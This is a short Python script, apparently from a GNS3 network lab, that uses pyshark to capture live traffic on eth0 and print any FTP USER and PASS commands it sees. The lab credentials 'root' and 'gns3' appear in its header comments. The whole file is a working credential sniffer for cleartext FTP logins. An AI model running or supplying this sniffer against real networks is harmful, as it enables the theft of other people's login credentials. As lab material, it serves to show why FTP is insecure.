#ip ftp username root
#ip ftp password gns3
#copy running-config ftp
#FTP

import pyshark

capture = pyshark.LiveCapture('eth0')
for packet in capture:
    if 'FTP' in packet:
        try:
            output = packet.ftp
            if 'USER' in str(output):
                print('------------------------------------')
                print('USERNAME: ')
                print(output)
            elif 'PASS' in str(output):
                print('------------------------------------')
                print('PASSWORD: ')
                print(output)
        except:
            pass

